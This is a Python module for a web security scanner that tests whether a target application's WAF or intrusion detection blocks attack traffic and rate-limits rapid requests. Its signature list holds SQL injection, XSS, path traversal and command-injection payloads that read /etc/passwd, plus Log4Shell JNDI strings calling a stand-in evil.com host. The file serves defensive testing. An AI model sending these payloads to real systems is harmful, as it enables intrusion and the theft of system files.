"""Alert Detection Scanner"""

from typing import List, Dict, Optional
import aiohttp
import asyncio
import time
import hashlib

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class AlertDetectionScanner(BaseScanner):
    """
    Scanner to test if attacks trigger alerts/blocking.
    
    Tests whether the application detects and responds to:
    1. Rapid successive requests (potential scan detection)
    2. Known attack signatures
    3. Anomalous behavior patterns
    4. Honeytokens/canary detection
    """
    
    name = "Alert Detection Scanner"
    description = "Tests if security attacks trigger alerts or blocking mechanisms"
    owasp_category = OWASPCategory.A09_LOGGING_ALERTING_FAILURES
    
    # Known attack signatures that should trigger WAF/IDS
    ATTACK_SIGNATURES = [
        # SQL Injection
        ("' OR 1=1--", "SQL Injection"),
        ("'; DROP TABLE users;--", "SQL Injection"),
        ("1' AND '1'='1", "SQL Injection"),
        
        # XSS
        ("<script>alert('XSS')</script>", "XSS"),
        ("<img src=x onerror=alert(1)>", "XSS"),
        ("javascript:alert(1)", "XSS"),
        
        # Path Traversal
        ("../../../etc/passwd", "Path Traversal"),
        ("....//....//....//etc/passwd", "Path Traversal"),
        ("..\\..\\..\\windows\\system32\\config\\sam", "Path Traversal"),
        
        # Command Injection
        ("; cat /etc/passwd", "Command Injection"),
        ("| whoami", "Command Injection"),
        ("$(id)", "Command Injection"),
        ("`id`", "Command Injection"),
        
        # SSTI
        ("{{7*7}}", "SSTI"),
        ("${7*7}", "SSTI"),
        ("#{7*7}", "SSTI"),
        
        # Log4j
        ("${jndi:ldap://evil.com/a}", "Log4Shell"),
        ("${jndi:rmi://evil.com/a}", "Log4Shell"),
    ]
    
    # Headers to inject attack payloads
    INJECTABLE_HEADERS = [
        'User-Agent',
        'X-Forwarded-For',
        'Referer',
        'Cookie',
        'X-Requested-With',
    ]

    async def scan(self, session: aiohttp.ClientSession,
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test alert detection capabilities"""
        vulnerabilities = []
        
        # Test WAF/IDS detection with attack signatures
        detection_results = await self._test_signature_detection(session, url, params)
        vulnerabilities.extend(detection_results)
        
        # Test rapid request detection (scan detection)
        rate_vulns = await self._test_rapid_request_detection(session, url)
        vulnerabilities.extend(rate_vulns)
        
        # Test blocking persistence
        blocking_vulns = await self._test_blocking_persistence(session, url, params)
        vulnerabilities.extend(blocking_vulns)
        
        return vulnerabilities
    
    async def _test_signature_detection(self, session: aiohttp.ClientSession,
                                         url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test if known attack signatures trigger detection"""
        vulnerabilities = []
        
        detected_attacks = []
        undetected_attacks = []
        
        if not params:
            params = {'q': 'test', 'input': 'test', 'search': 'test'}
        
        for payload, attack_type in self.ATTACK_SIGNATURES:
            # Test in parameters
            test_params = params.copy()
            param_key = list(test_params.keys())[0] if test_params else 'input'
            test_params[param_key] = payload
            
            was_blocked = await self._check_if_blocked(session, url, test_params, payload)
            
            if was_blocked:
                detected_attacks.append(attack_type)
            else:
                undetected_attacks.append((attack_type, payload))
            
            await asyncio.sleep(0.1)
        
        # Test in headers too
        for payload, attack_type in self.ATTACK_SIGNATURES[:5]:  # Limit header tests
            for header in self.INJECTABLE_HEADERS[:2]:
                headers = {header: payload}
                
                response = await self.make_request(session, "GET", url, headers=headers)
                if response and response.status in [403, 406, 418, 429]:
                    if attack_type not in detected_attacks:
                        detected_attacks.append(attack_type)
                
                await asyncio.sleep(0.05)
        
        # Analyze results
        total_signatures = len(self.ATTACK_SIGNATURES)
        detected_count = len(set(detected_attacks))
        detection_rate = (detected_count / total_signatures) * 100 if total_signatures > 0 else 0
        
        if detection_rate < 20:
            # Very low detection - significant concern
            vulnerabilities.append(self.create_vulnerability(
                vuln_type="Insufficient Attack Signature Detection",
                severity=Severity.MEDIUM,
                url=url,
                evidence=f"Only {detected_count}/{total_signatures} attack signatures triggered blocking ({detection_rate:.0f}%)",
                description=(
                    "The application shows minimal detection and blocking of known attack patterns. "
                    "Common attack signatures for SQL injection, XSS, command injection, and path traversal "
                    "were sent without triggering security responses.\n\n"
                    f"Undetected attack types: {', '.join(set(a[0] for a in undetected_attacks[:5]))}\n\n"
                    "This indicates:\n"
                    "- No WAF or insufficient WAF rules\n"
                    "- Lack of attack detection and logging\n"
                    "- Unable to alert on active attacks in real-time"
                ),
                cwe_id="CWE-778",
                cvss_score=5.3,
                remediation=(
                    "1. Deploy a Web Application Firewall (WAF) with current rule sets\n"
                    "2. Implement the OWASP ModSecurity Core Rule Set\n"
                    "3. Configure logging for all blocked requests\n"
                    "4. Set up real-time alerting for attack patterns\n"
                    "5. Integrate with SIEM for correlation and analysis\n"
                    "6. Regularly update attack signature databases"
                ),
                references=[
                    "https://owasp.org/www-project-modsecurity-core-rule-set/",
                    "https://owasp.org/www-community/Web_Application_Firewall",
                    "https://cwe.mitre.org/data/definitions/778.html"
                ]
            ))
        elif detection_rate < 50:
            # Partial detection - some concern
            vulnerabilities.append(self.create_vulnerability(
                vuln_type="Partial Attack Signature Detection",
                severity=Severity.LOW,
                url=url,
                evidence=f"Detected {detected_count}/{total_signatures} attack signatures ({detection_rate:.0f}%)",
                description=(
                    "The application has some attack detection capabilities but coverage is incomplete. "
                    f"Detection rate: {detection_rate:.0f}%\n\n"
                    "Some attack types may not trigger alerts, reducing visibility into active attacks."
                ),
                cwe_id="CWE-778",
                cvss_score=3.7,
                remediation=(
                    "1. Review and expand WAF rule coverage\n"
                    "2. Add rules for undetected attack patterns\n"
                    "3. Enable logging for all rule matches, not just blocks\n"
                    "4. Test WAF effectiveness regularly"
                ),
                references=[
                    "https://owasp.org/www-project-modsecurity-core-rule-set/",
                    "https://cwe.mitre.org/data/definitions/778.html"
                ]
            ))
        
        return vulnerabilities
    
    async def _test_rapid_request_detection(self, session: aiohttp.ClientSession,
                                             url: str) -> List[Vulnerability]:
        """Test if rapid requests (scanning behavior) are detected"""
        vulnerabilities = []
        
        # Send rapid requests to simulate scanning
        request_count = 30
        blocked = False
        block_time = None
        successful_requests = 0
        
        start_time = time.time()
        
        for i in range(request_count):
            # Vary the request slightly to simulate scanner behavior
            test_url = f"{url}?scan_test={i}&timestamp={time.time()}"
            
            response = await self.make_request(session, "GET", test_url)
            
            if response:
                if response.status in [429, 503, 403]:
                    blocked = True
                    block_time = i + 1
                    break
                elif response.status == 200:
                    successful_requests += 1
            
            # Very short delay to simulate aggressive scanning
            await asyncio.sleep(0.02)
        
        elapsed = time.time() - start_time
        requests_per_second = request_count / elapsed if elapsed > 0 else 0
        
        if not blocked and successful_requests >= request_count - 2:
            vulnerabilities.append(self.create_vulnerability(
                vuln_type="No Scan Detection / Rate Limiting",
                severity=Severity.LOW,
                url=url,
                evidence=f"Completed {successful_requests}/{request_count} rapid requests ({requests_per_second:.1f} req/s) without triggering rate limiting or blocking",
                description=(
                    "The application allowed rapid successive requests without rate limiting or blocking. "
                    "This scanning behavior pattern was not detected:\n"
                    f"- Sent {request_count} requests in {elapsed:.1f} seconds\n"
                    f"- Rate: {requests_per_second:.1f} requests/second\n"
                    f"- No blocking or throttling observed\n\n"
                    "Attackers can freely scan and enumerate the application without detection. "
                    "This allows reconnaissance activities to go unnoticed."
                ),
                cwe_id="CWE-778",
                cvss_score=3.7,
                remediation=(
                    "1. Implement rate limiting on all endpoints\n"
                    "2. Configure alerting for abnormal request rates\n"
                    "3. Use tools like fail2ban to detect and block scanning\n"
                    "4. Implement progressive delays for suspicious patterns\n"
                    "5. Log and alert on rapid sequential requests from single IPs"
                ),
                references=[
                    "https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks",
                    "https://cwe.mitre.org/data/definitions/778.html"
                ]
            ))
        elif blocked:
            # Good - scanning was detected
            # Optionally report as INFO that protection exists
            pass
        
        return vulnerabilities
    
    async def _test_blocking_persistence(self, session: aiohttp.ClientSession,
                                          url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test if blocking persists after attack detection"""
        vulnerabilities = []
        
        # First, trigger a potential block with an obvious attack
        attack_payload = "' OR '1'='1'; DROP TABLE users;--<script>alert(1)</script>../../../etc/passwd"
        
        if not params:
            params = {'input': 'test'}
        
        test_params = params.copy()
        param_key = list(test_params.keys())[0]
        test_params[param_key] = attack_payload
        
        # Send attack
        attack_response = await self.make_request(session, "GET", url, params=test_params)
        
        if attack_response and attack_response.status in [403, 406, 429]:
            # Attack was blocked, now test if blocking persists
            await asyncio.sleep(1)
            
            # Try a normal request
            normal_response = await self.make_request(session, "GET", url, params=params)
            
            if normal_response and normal_response.status == 200:
                # Blocking didn't persist - might be intentional (per-request blocking)
                # This is informational
                pass
            elif normal_response and normal_response.status in [403, 429]:
                # Blocking persisted - good security practice
                vulnerabilities.append(self.create_vulnerability(
                    vuln_type="Persistent Blocking After Attack Detection",
                    severity=Severity.INFO,
                    url=url,
                    evidence="Normal requests blocked after attack payload was detected",
                    description=(
                        "The application implements persistent blocking after detecting an attack. "
                        "This is a good security practice that prevents attackers from continuing "
                        "after being detected. However, ensure:\n"
                        "- Legitimate users aren't permanently blocked\n"
                        "- Block duration is appropriate\n"
                        "- Incidents are logged for review"
                    ),
                    cwe_id="CWE-778",
                    cvss_score=0.0,
                    remediation="Ensure blocking is logged and alerts are generated for security team review.",
                    references=["https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"]
                ))
        
        return vulnerabilities
    
    async def _check_if_blocked(self, session: aiohttp.ClientSession,
                                 url: str, params: Dict[str, str],
                                 payload: str) -> bool:
        """Check if a request was blocked"""
        response = await self.make_request(session, "GET", url, params=params)
        
        if not response:
            return False
        
        # Check status code
        if response.status in [403, 406, 418, 429, 503]:
            return True
        
        # Check response body for WAF indicators
        try:
            body = await response.text()
            waf_indicators = [
                'blocked', 'forbidden', 'denied', 'rejected',
                'not acceptable', 'security', 'firewall', 'waf',
                'attack', 'malicious', 'suspicious', 'violation',
                'access denied', 'request blocked', 'cloudflare',
                'akamai', 'imperva', 'f5', 'mod_security'
            ]
            body_lower = body.lower()
            if any(indicator in body_lower for indicator in waf_indicators):
                return True
        except Exception:
            pass
        
        return False